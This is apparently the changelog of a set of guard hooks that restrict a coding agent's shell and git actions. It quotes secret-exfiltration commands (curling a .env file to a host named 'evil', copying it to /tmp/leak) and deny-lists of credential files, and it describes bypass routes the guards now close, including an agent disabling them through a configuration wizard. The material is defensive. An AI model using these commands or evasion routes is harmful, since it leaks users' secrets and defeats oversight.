# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

### Fixed

- **git-safety: `git rebase --onto <protected>` is no longer falsely blocked**
  (#74 on claude-configurations). `check_rebase_blocked` flagged any rebase
  whose args contained a bare `main`/`master`, catching `git rebase --onto main
  <upstream> <branch>` — a documented stacked-PR restack where main is the
  replay destination and is never rewritten. The token following `--onto` is now
  exempt; a protected branch named anywhere else (plain `git rebase main`, or as
  the trailing `<branch>`) still blocks.
- **secret guards: block `.git-credentials`, `.pgpass`, `.aws/credentials`,
  `.kube/config`** (#77 on claude-configurations). These plaintext credential
  stores were in neither deny-list, so Read/Grep/Write/Edit operated on them
  freely. `.git-credentials`/`.pgpass` (unique basenames) join
  `BLOCKED_FILENAMES`; `.aws/credentials`/`.kube/config` join
  `BLOCKED_PATH_FRAGMENTS` as parent-dir-qualified fragments so a bare
  `config`/`credentials` file elsewhere is not over-blocked. (The Bash arms stay
  `.env`-family-only, as for `id_rsa`/`.netrc` today.)
- **session: registry records are written atomically** (#79 on
  claude-configurations). `write_record` used `fs::write` (truncate-then-write),
  exposing a window where a concurrent `read_peers` lands on a 0-byte/partial
  file, fails to parse, and silently drops a live peer — worst case, a peer
  missing from the one-shot SessionStart disclosure for the whole session.
  Records now stage to a temp file in the same directory and `rename` over the
  target, so a reader only ever sees a complete document.
- **session: the lane guard now assesses MultiEdit** (#80 on
  claude-configurations). The guard matched only Edit/Write, so a MultiEdit into
  a peer's declared `touching` lane slipped through unwarned. MultiEdit carries a
  top-level `file_path`, so matching the arm is sufficient (the hook matcher
  already routes MultiEdit to the binary).
- **obsidian trash_guard: quoted vault paths no longer evade the check** (#82 on
  claude-configurations). When cwd was outside the vault, the in-vault scan used
  raw `split_whitespace`, so a quoted absolute vault path evaded it — a leading
  `"` defeated the absolute-path test, and a quoted path with spaces (e.g.
  `Field Reports/…`) was shredded across tokens. The scan now uses the
  quote-aware `core::shell::tokenize`, so `rm "/vault/Field Reports/old.md"` is
  caught; out-of-vault quoted paths stay allowed.
- **content guards: terminology, orphaned-todos, and line-endings now inspect
  MultiEdit** (#83 on claude-configurations). All three gated on
  `input.content()`, which is `None` for a MultiEdit payload (it carries
  `edits[]`), so every MultiEdit hit the early allow() unchecked. A new
  `HookInput::edit_fragments()` exposes the introduced/removed fragment pairs —
  one per `edits[]` element — that the guards fold over; terminology preserves
  its introduced-vs-existing diff (#63) per edit. Write/single-Edit behavior is
  unchanged.

## [0.29.0] - 2026-06-10

### Fixed

- **core::shell: model heredoc bodies, command substitutions, and visible
  assignments** (#116 on claude-configurations). `split_segments` now strips
  heredoc bodies before splitting, so a heredoc line like `see the .env file`
  no longer becomes a fake `see` command with a `.env` operand — a real
  prevent-secret-leaks false-block on 0.28.0. `command_segments` additionally
  surfaces command substitutions (`$(…)`, backticks) in executed context, so
  `echo $(cat .env)`, `curl -d "$(cat .env)" …`, and `echo \`cat .env\`` are
  judged as the reads they are; and resolves visible `VAR=value` assignments,
  so `OP_CMD=op; $OP_CMD item list` is seen as `op item list`. Single-quoted
  and escaped forms stay literal; an environment-sourced variable stays
  unresolved (fail open). A body is dropped only when its terminator is found
  (an exotic delimiter or a `<<` inside double quotes keeps the lines, so a
  command bash executes is never silently dropped). Every guard inherits these
  through `command_segments`.
- **git-safety: consume remaining separate-arg global flags; nudge
  `checkout --` named-pathspec discards** (#117 on claude-configurations).
  Git's remaining enumerable global flags that take a separate argument —
  `--namespace`, `--super-prefix`, `--config-env`, `--attr-source` — now
  consume their argument, so `git --namespace ns push --force origin main` no
  longer hides the subcommand and escapes (only a truly unknown future
  separate-arg flag remains a documented gap). `git checkout [-<ref>] --
  <named paths>` now nudges — the same overwrite-local-edits operation as
  `git restore <named path>` — since everything after `--` is unambiguously a
  pathspec; discard-all forms (`.`, `./`, `:/`) keep blocking, and bare
  `git checkout <name>` without `--` stays out of scope.
- **secret guards: `find -exec`/`-delete` no longer escapes the metadata-safe
  exemption** (#118 on claude-configurations). `find` is metadata-safe on its
  own, but `find . -name .env -exec cat {} \;` printed contents and `find .
  -name .env -delete` / `-exec rm {} \;` destroyed the file — both allowed on
  0.28.0. prevent-secret-leaks now judges the exec-family subcommand (`-exec`,
  `-execdir`, `-ok`, `-okdir`): a non-metadata-safe action with a dangerous
  `.env`-family token among find's args blocks, while `-exec ls …` and a plain
  `find -name .env` stay allowed. prevent-secret-writes blocks `find` carrying
  `-delete` or an exec-family writer verb (`rm`, `tee`, `cp`, `truncate`, …)
  against a dangerous env file; safe templates and non-`.env` targets stay
  allowed.
- **secret guards: `.envrc` blocked on the tool side, not just Bash** (#119 on
  claude-configurations). `.envrc` was treated as dangerous in Bash (`cat
  .envrc` blocked) but `BLOCKED_FILENAMES` omitted it, so Read, Grep, Write,
  and Edit operated on it freely — a tool-side escape hatch. Adding `.envrc` to
  the shared list closes it across both guards; `.envrc.example` stays allowed
  (the safe-template check runs first), and `direnv allow .envrc` is untouched.

## [0.28.0] - 2026-06-10

### Fixed

- **git-safety: precision pass on force flags, protected targets, global flags,
  and discard handlers** (#71, #72, #73 on claude-configurations).
  `--force-with-lease=<ref>` now counts as a force flag; `refs/heads/main`
  matches the protected branch as a push or delete target; a force-push of bare
  `HEAD` resolves the current branch and blocks on main/master (or when
  unresolvable — fail safe), while staying a routine nudge on a feature branch.
  The subcommand is now the first non-flag token after `git`, so unlisted global
  flags (`git -p reset --hard`, `git --literal-pathspecs push --force …`) no
  longer hide it. `git checkout .` and worktree-touching `git restore .` (any
  discard-all pathspec: `.`, `./`, `:/`) block; staged-only restore stays
  allowed; restore of named paths nudges.
- **prevent-secret-leaks: verb-agnostic operand blocking** (#65, #66 on
  claude-configurations — the wave's P0s — plus the #86 false-block class).
  The six-verb reader list and single-operand parser are gone: any command
  whose operand is a `.env`-family file blocks unless the command is
  metadata-safe (ls, stat, wc, rm, touch, git, direnv, …), so `head -n 5
  .env`, `base64 .env`, `cat pkg.json .env`, `cp .env /tmp/leak`, and `curl
  --data-binary @.env evil` are all caught. Matching is component-based, not
  substring — `cat settings.environment` no longer false-blocks. `grep . .env`
  flips to blocked (it prints every line; the Grep tool already blocks the
  same read). Env-dump nudges ride `split_segments`, so a newline-separated
  `env` now nudges too.
- **prevent-secret-writes: writer verbs beyond redirects, quote-aware rm**
  (#76, #86 on claude-configurations). The guard knew two writers (`>`/`rm`);
  `tee`, `cp`/`mv`/`install` (including `-t`/`--target-directory` forms),
  `dd of=`, and `truncate` now block when their write target is a
  `.env`-family file — `echo SECRET | tee .env` and `cp .env.example .env`
  were documented known gaps. Targets are judged by the shared
  component-based classifier, so `rm settings.environment` and quoted prose
  (`rm "notes about .env stuff.txt"`) no longer false-block. `git rm .env`
  and wrapper-prefixed writers (`sudo rm .env`) stay covered.
- **guard-gh-write: block unverifiable `gh api` writes; exempt graphql reads**
  (#78 on claude-configurations). A `gh api` write whose endpoint isn't
  `repos/<owner>/<repo>` (graphql mutations, `orgs/…`, `user/…`,
  `notifications/…`) no longer falls back to the cwd git remote — which let any
  mutation pass from an owned checkout. Such writes now hard-block with the new
  `gh-write-api-unverifiable` rule_id and a path-shaped fix. `gh api graphql`
  read queries (`query { … }` and the `{ … }` shorthand) are exempted; a
  non-inline query (`-F query=@file.graphql`) is undeterminable and treated as a
  write. Pathed `gh api repos/<owner>/<repo>` writes keep the ownership check and
  non-api gh writes keep the remote fallback.
- **guard-op-vault-scan: tokenized adjacent-pair detection robust to global
  flags** (#81 on claude-configurations). Detection no longer enumerates command
  shapes with a regex — each shell segment is tokenized, and a scan is any `op`
  invocation (basename of the command word) with an `item`/`vault` token
  immediately followed by `list` after the command word. 1Password global flags
  between `op` and the subcommand (`op --format json item list`,
  `op --account x item list`, `op --cache item list`, `op --session abc item
  list`) no longer evade the guard, and quoted-prose protection plus shell-wrapper
  expansion (`bash -c '…'`) are now structural via `command_segments`.
- **guard-gh-dangerous: catch the API-form repo delete** (#88 on
  claude-configurations). `gh api -X DELETE repos/<owner>/<repo>` is an
  irreversible repo deletion that the subcommand-form regex (`gh repo delete`)
  never saw. A tokenized pass now blocks it across every Cobra method spelling
  (`-X delete`, `--method delete`, `-X=DELETE`, `--method=DELETE`, `-XDELETE`),
  in chains and `sh -c` wrappers, but only at exact owner/repo depth — sub-resource
  deletes (`repos/o/r/issues/1`, `repos/o/r/git/refs/heads/x`) stay allowed.

## [0.27.0] - 2026-06-10

### Added

- `core::shell::split_segments` / `command_segments` — quote-aware splitting of a
  shell command into its top-level segments (`&&`, `||`, `;`, `|`, `&`, newline),
  with recursive `sh -c '…'` wrapper expansion. The shared primitive guards use
  to judge every command a shell will run, not just the first.

### Fixed

- **git-safety: compound-command and quote-aware bypasses** (#61, #62, #63).
  git-safety now judges every command in a chain — `git status && git push
  --force origin main` no longer slips because the first command is benign — and
  sees through `sh -c '…'` wrappers, matches path-form git (`/usr/bin/git`),
  reads quoted flags (`"--force"`), and exempts an alias definition only for its
  own segment instead of the whole command line.
- **guard-gh-write: chained writes resolved per-segment** (#67). A gh write chain
  is now judged one command at a time — `gh pr comment -R me/owned … && gh repo
  delete evil/unowned --yes` no longer slips because the benign first `-R`
  resolved the whole chain. Each write segment resolves its own target (and a
  write hidden in `sh -c '…'` is seen); the first unowned/unresolvable write
  blocks. Loop handling and structured block payloads are unchanged.
- **prevent-secret-writes: every redirect in a chain is inspected** (#75). The
  guard scanned only the first `>`/`>>`, so `echo ok > safe.txt && echo SECRET >
  .env` slipped. It now scans each command segment for all redirect operators —
  `>`, `>>`, `>|`, and stderr/fd forms (`2>`) — quote-aware (a `>` inside a
  string is literal), plus `rm` targets, and sees writes hidden in `sh -c '…'`.
  `split_segments` also no longer mis-splits the `>|` clobber operator as a pipe.

## [0.25.0] - 2026-06-08

### Added

- `guard-browser-device` (guardrails, PreToolUse) blocks the **first**
  Claude-in-Chrome MCP tool call of a session (`mcp__claude-in-chrome__*`),
  exiting 2 with a re-clarify message that routes through
  `list_connected_browsers` → `AskUserQuestion` → `select_browser`. It writes a
  per-session marker and allows every subsequent call — a one-shot handshake so
  an unconfirmed action can't land on the wrong physical Chrome when several are
  paired to one account. **Deliberate policy exception** to `developing-guards`'
  block-vs-nudge heuristic: a single connected browser would route to a nudge,
  but a nudge is exit 0 and the tool still runs, so its context would arrive
  *after* the action already hit a device. Stopping *before* the irreversible
  side effect requires exit 2. The guard fires at most once per session, fails
  open on any error (ADR-0001), and does not verify a device was actually chosen
  — it trusts the model to act on the message, then opens the gate. (Companion
  `mcp__claude-in-chrome__.*` matcher ships in `cadence-guardrails`'s `hooks.json`.)
- `warn-overshare` (cadence): nudges Claude to audit about-to-ship content (commit messages, PR/issue bodies, changed files) for personal-context overshare — disabilities, neurodivergence, health, relationships, family, non-technical biographical detail. Fires on `git push`, `git commit`, `gh pr create`, `gh pr edit`, `gh issue create`, `gh issue comment`, and Write/Edit to `docs/field-reports/` paths. Skips writes under `$OBSIDIAN_VAULT` (the safe destination for personal context) and to `docs/blog/*retro*` paths (retros feed blog articles and are intentionally personal). Session-scoped bypass: `CADENCE_SKIP_OVERSHARE_AUDIT=1`. (Companion `hooks.json` wiring ships in `cadence-guardrails`.)
- New `guardrails inject-gh-context` check (SessionStart): renders the configured gh-write allowlist (`CADENCE_ALLOWED_OWNERS`, `CADENCE_ALLOWED_REPOS`, `CADENCE_EXTRA_HOSTS`) and the `gh ... -R owner/repo` rule into Claude's context at session start, resume, and post-compaction. Companion wiring ships in `cadence-canon`'s `hooks.json`. Primes the model with the same context `guard-gh-write` enforces, recovering "silent damage" cases where `cwd`'s remote happens to be allowlisted but is not the intended write target.

## [0.24.0] - 2026-06-08

### Added

- New `CheckResult::block_structured(message, BlockMetadata)` builder + `BlockMetadata` struct (`rule_id`, `fix`, `allowed_owners`, `severity`) in `cadence_hooks_core`. When a check returns a structured block on a PreToolUse event, `run_check` now emits a `permissionDecision: "deny"` JSON envelope on stdout (carrying both `permissionDecisionReason` for the prose and `additionalContext` for the structured payload) alongside the legacy stderr+exit-2 message — Claude self-corrects from the machine-parseable shape instead of re-parsing prose. The legacy `CheckResult::block(...)` path is unchanged; checks opt in by calling `block_structured`.
- `guardrails guard-gh-write` upgraded three of its hard-block sites to the new primitive:
  - `gh-write-unauthorized-target` — `fix` substitutes the first allowed owner under the same project name (e.g. `evil-corp/cool` → `-R cameronsjo/cool`).
  - `gh-write-target-unresolvable` — `fix` is `-R <first-allowed-owner>/<repo>` when no repo can be inferred.
  - `gh-write-loop-missing-repo` — `fix` is the resolved repo when a deterministic loop's cwd resolves to an owned repo, or `-R <owner>/<repo>` otherwise.

  The unconfigured fail-safe and fork-not-allowed paths intentionally stay on the legacy `block` for now and will follow in a separate PR.

## [0.23.0] - 2026-06-06

### Added

- Hard blocks now carry a feedback-channel footer — `If this fired in error: /cadence:feedback` — appended to the stderr message of any `Outcome::Block`. It turns a false-positive block into one structured issue on the meta-repo (`cameronsjo/claude-configurations`) via the new `cadence:feedback` skill, instead of silent friction. Nudges and loop-blocks are untouched (they aren't errors). Suppress with `CADENCE_NO_FEEDBACK_FOOTER` set to any non-empty value.

## [0.21.0] - 2026-06-05

### Added

- Native Windows support for the binary. CI now runs check/clippy/test on `windows-latest`, and the release pipeline builds an `x86_64-pc-windows-msvc` leg, shipping `cadence-hooks.exe` in a `.zip` (with checksum + provenance) alongside the existing unix `.tar.gz` artifacts. The Homebrew tap dispatch is unchanged.

### Changed

- Replaced ten POSIX-only assumptions with portable code so the binary is correct outside WSL/unix: a `cadence_hooks_core::paths::user_home()` helper (`HOME` → `USERPROFILE` → `HOMEDRIVE`+`HOMEPATH`) and `marker_temp_dir()` (`std::env::temp_dir`) replace `HOME`-or-`/tmp` reads and hardcoded `/tmp` markers; a single jiff-backed `cadence_hooks_core::time` module replaces four `date -u` shell-outs (and gives `warn-cron-datetime` portable local time + timezone + weekday); and `obsidian-trash-guard` normalizes both the vault root and hook paths before comparison. Adds `jiff` as the one new dependency.

## [0.20.0] - 2026-06-04

### Changed

- `guard-git-init` now also fires on `gh repo create` (not just `git init`), and its nudge frames the license as the author's decision — routing to `/cadence-groundwork:choosing-license` to compare options before assuming one. The guard name is unchanged. (Companion `if`-filter broadening ships in `cadence-guardrails`'s `hooks.json`.)

## [0.19.0] - 2026-06-04

### Changed

- `validate-skill-frontmatter` now accepts an optional `namespace:` prefix on a skill's `name:` field — the `plugin:directory` invocation id (e.g. `name: cadence:attune`, `name: cadence-forge:add-narrative-logging`). Bare names still pass; the post-colon suffix must still equal the skill directory, so `cadence:wrong` for an `attune/` dir is still blocked. The namespace itself is not verified against the plugin name: deriving the plugin from the file path is fragile (source vs cache) and the check must not force the prefix on non-cadence users. This reverses the prefix-rejection tightened in #65 — the cadence ecosystem standardizes on the prefix for discoverability and self-documenting source.

## [0.18.0] - 2026-06-04

### Changed

- Global state paths (metrics, persona ledger, the `doctor` plugin scan) now honor `CLAUDE_CONFIG_DIR`, matching Claude Code's own config-dir relocation, instead of hardcoding `~/.claude`. A new `cadence_hooks_core::paths` module resolves the config dir (first non-empty comma entry, `~`-expanded; falls back to `~/.claude`); `doctor`'s plugin scan falls back to `~/.claude/plugins` when the config-dir variant is absent, staying correct whichever directory the plugin loader uses.

## [0.15.1] - 2026-06-02

### Changed

- `guard-pr-issue-link` renamed to `warn-pr-issue-link` and downgraded from a hard block to a nudge. PRs without a linked issue are a routine, intentional workflow; the check now reminds about closing keywords instead of blocking `gh pr create`. The companion `verify-pr-autoclose` (PostToolUse, advisory) is unchanged and still covers broken issue refs.

## [0.13.0] - 2026-06-01

### Added

- Five guardrails checks converting machine-enforceable prose rules from a personal CLAUDE.md into deterministic hooks (#52, #53):
  - `guard-op-vault-scan` (**block**) — `op item list` / `op vault list` enumeration, including inside exec wrappers. Single-item reads (`op read`, `op item get`) stay allowed; the guard targets enumeration, not access.
  - `warn-curl-alias` (nudge) — bare `curl` with `-H`/`--header` flags, for machines where curl is aliased to curlie (which infers POST from JSON-like headers, causing silent 400s). Per-segment analysis keeps `grep -H` and other piped tools from false-positiving.
  - `warn-gh-merge-preflight` (nudge) — pre-flight checklist on `gh pr merge`: draft PRs report MERGEABLE/CLEAN but fail with a GraphQL error (check `isDraft`); worktree checkouts break `--delete-branch` local cleanup; failed merges may have landed server-side (verify `mergedAt` before retrying).
  - `warn-coderabbit-retrigger` (nudge) — `@coderabbitai review` comments are no-ops on already-reviewed content (CodeRabbit's incremental review is content-cached, not SHA-cached); push a new commit instead.
  - `warn-alias-parsing` (nudge) — piping aliased-tool output (`cat`/`find`/`ls`/`du`/`df`/`top` → bat/fd/eza/dust/duf/btm) into parsers. Fires only when the aliased tool is a pipeline *producer*; consumer position (`git diff | cat`) and interactive use stay silent.
- `KNOWN_DISTINCT_SETTINGS_SCRIPTS` allowlist in the registration audit test, for settings.json scripts that trip the keyword-overlap heuristic without duplicating any plugin hook (first entry: `block-vault-git-writes.sh`, an Obsidian-vault guard unrelated to the 1Password `guard-op-vault-scan`).

## [0.12.0] - 2026-06-01

Backfilled entry — this release shipped without a changelog section.

### Added

- Three guardrails checks: `guard-dotfiles` (block direct edits to production dotfiles, opt-in via `CADENCE_GUARD_DOTFILES=1`), `guard-pr-issue-link` (block `gh pr create` without a closing issue keyword), `verify-pr-autoclose` (verify and repair issue auto-close after PR create/merge). (#43, #47)
- `doctor` subcommand cross-reference + registry export + `--quiet`. (#39, #48)

### Fixed

- Mid-line security-pattern line numbers + audit enforcement for the cadence-rules migration. (#49)

### Removed

- Homebrew beta channel retired; stable formula is the single release channel. (#39, #50)

## [0.11.0] - 2026-05-30

### Added

- `lab` namespace for the [cadence-lab](https://github.com/cameronsjo/cadence-lab) plugin: a two-hook **self-representation persona ledger**. `persona-nudge` (SessionStart, startup/clear) injects a constrained contract asking the model to record a per-session self-representation (form/qualities/stance/color/texture/confidence) to a staging file; `persona-gate` (PostToolUse/Write) runs Tier 1 schema validation with itemized feedback plus a Tier 2 regex cheek heuristic (warn mode → system-written `flags`), then promotes the validated record into an append-only `~/.claude/persona/personas.jsonl`. The ledger only receives hook-written, validated records. Configurable via `~/.claude/persona/config.json`; retry cap downgrades to a `forced-accept` flag. New crate `crates/lab/`. (#41)
- Core: `HookEvent::SessionStart`, and `Outcome::LoopBlock` + `CheckResult::loop_block` — the documented exit-0 `{"decision":"block","reason":...}` re-prompt primitive for PostToolUse feedback loops (a hard `exit 2` can't un-run a tool that already executed). `HookInput` gains `session_id`/`source`/`model` fields + accessors (`Default` derived); new `make_session` test builder. All backward compatible — existing Pre/Post hooks are unaffected.

## [0.10.0] - 2026-05-23

### Added

- `metrics` namespace: fire-and-forget loggers for the [cadence-metrics](https://github.com/cameronsjo/cadence-metrics) plugin, ported from its bash hooks. `snapshot` (PreToolUse) records HEAD before a `git commit`; `log-commit` (PostToolUse) scans the transcript for token usage since the last commit, computes USD cost from an embedded-but-overridable price table (`--prices` / `CADENCE_METRICS_PRICES`), and appends to `commits.jsonl`; `log-subagent` (SubagentStart/Stop) appends lifecycle records to `subagents.jsonl` (`CADENCE_METRICS_DEBUG=1` adds a `_keys` field). New `Logger` trait + `run_logger_from_stdin` in core keep logging (always exit 0) separate from the enforcement `Check` trait. JSONL output verified at parity with the bash hooks.
- `nudge-polish-before-pr` hook (cadence plugin) fires on `gh pr create` and reminds the model to run `/polish` (cadence-forge:polish) — a branch-scoped polish pass against `origin/main` — before opening the PR. Gated by `if: "Bash(gh pr create*)"` so the binary only spawns on actual PR-create commands. Skippable for trivial fixes or branches already polished. Disable via `CADENCE_DISABLE=nudge-polish-before-pr`.
- `CADENCE_ALLOW_MAIN` env var permanently silences `warn-main-branch` for a repo. Set in `<repo>/.claude/settings.json` (project) or `~/.claude/settings.json` (user-global) under the `env` block. Truthy values: `1`, `true`, `yes` (case-insensitive). Useful for repos where main IS the working branch by design — personal scratchpads, dotfiles, vaults.
- `cadence-hooks doctor` subcommand scans installed plugin `hooks.json` files for shell-expansion bugs (initially: single-quoted `${CLAUDE_PLUGIN_ROOT}` and bare env vars). Reports one block per offender; exits 1 when violations exist. `--root <dir>` overrides the default `~/.claude/plugins/cache` scan path. (#24)
- `Check::skip_at_effort()` trait method lets individual checks opt out at specific `$CLAUDE_EFFORT` levels without each implementer reading the env var by hand. Default `&[]` preserves current behavior — opt in for heavy diagnostics that are optional on trivial sessions. (#23)

### Changed

- `warn-main-branch` message now suggests `--for 2h` (was `30m`) and surfaces both silencing options: time-bounded snooze and permanent `CADENCE_ALLOW_MAIN` env var.

### Fixed

- `warn-main-branch` now scopes branch detection to the edited file's repo via `git -C`, resolves relative file paths against `HookInput.cwd`, and passes the resolved `repo_root` to the snooze lookup. Previously the hook resolved git context from the hook process's CWD, so editing inside a nested repo from a session whose CWD was the outer parent both fired wrong warnings and broke per-repo snooze suppression. (#26)
- `prevent-secret-leaks` env-dump heuristic now position-checks chain segments with a quote-aware splitter instead of substring-matching. Eliminates false positives on benign commands containing `env` as a substring — branch names ending in `-env`, commit messages mentioning env vars, `gh env list`, `aws-vault env`, `direnv env`, `grep env_dump`, and heredocs inside `"$(...)"` no longer fire the nudge. (#22, #25)

## [0.8.0] - 2026-04-21

### Changed (breaking)

- Renamed all configuration env vars under a unified `CADENCE_*` prefix:
  - `CADENCE_HOOKS_DISABLE` → `CADENCE_DISABLE`
  - `CADENCE_HOOKS_BYPASS` → `CADENCE_BYPASS`
  - `GIT_GUARDRAILS_ALLOWED_OWNERS` → `CADENCE_ALLOWED_OWNERS`
  - `GIT_GUARDRAILS_ALLOWED_REPOS` → `CADENCE_ALLOWED_REPOS`
- `OBSIDIAN_VAULT` stays unprefixed (cross-tool convention).

### Added

- Under Claude Code (detected via `CLAUDECODE=1`), the `configure` subcommand is hidden from `--help` and refuses to run interactively. `configure --list` stays available. This closes a bypass route where an agent could silently disable guardrails by launching the interactive wizard.

### Migration

Update `.claude/settings.json` or any shell rc where you set the old vars:

```diff
- "CADENCE_HOOKS_DISABLE": "guard-push-remote"
+ "CADENCE_DISABLE": "guard-push-remote"
- "GIT_GUARDRAILS_ALLOWED_OWNERS": "cameronsjo cameron"
+ "CADENCE_ALLOWED_OWNERS": "cameronsjo cameron"
```

## [0.4.1] - 2026-03-16

### Added

- AST-based chain analysis for `git push` — chained pushes to the same remote (e.g. `git push origin main && git push origin v1.0`) are now allowed instead of blanket-blocked
- 15 adversarial tests for chain analysis bypass attempts

### Fixed

- Cross-platform `bump-version.sh` — works on both macOS and Linux

## [0.4.0] - 2026-03-16

### Added

- AST-based loop analysis via `brush-parser` — loops with explicit targets pointing to owned repos are now permitted instead of blanket-blocked
- `warn-cron-datetime` guardrail for CronCreate hooks
- Unit tests for `warn-main-branch` (10 tests) and `check-idle-return` (11 tests)
- Adversarial input tests and edge case hardening across all hooks
- Panic handler for graceful failure reporting

### Changed

- Extracted shared shell utilities (`strip_quotes`, `repo_from_url`, `git_command`, `parse_work_dir`) into `cadence-hooks-core::shell`
- `guard-gh-write` now resolves `cd` chains via `parse_work_dir`
- Reordered `guard-push-remote` checks so structural blocks precede env var checks
- Narrowed version-mismatch catch-all to specific clap error kinds
- 551 tests (up from 486)

### Fixed

- Normalized file paths to prevent bypass attacks
- Reduced false positives from CodeRabbit review findings
- Fail open with warning on plugin version mismatch

## [0.3.0] - 2026-03-12

### Added

- Initial implementation: 19 hooks across 4 plugin crates
- Core protocol library (`cadence-hooks-core`) with `Check` trait, JSON parsing, exit codes
- **cadence** hooks: terminology, orphaned-todos, prevent-secret-leaks, prevent-secret-writes, memory-guard, git-safety, line-endings, env-vars, warn-untracked, markdown-lint
- **guardrails** hooks: guard-push-remote, guard-gh-write, guard-gh-dangerous, guard-git-init, warn-main-branch, check-idle-return
- **rules** hooks: validate-frontmatter, security-patterns
- **obsidian** hooks: trash-guard
- CI workflow with fmt, clippy, and test checks
- Release workflow with cross-compilation (linux x86_64/aarch64, macOS x86_64/aarch64)
- SLSA build provenance attestation on releases
- 486 tests covering happy paths, edge cases, and bypass scenarios
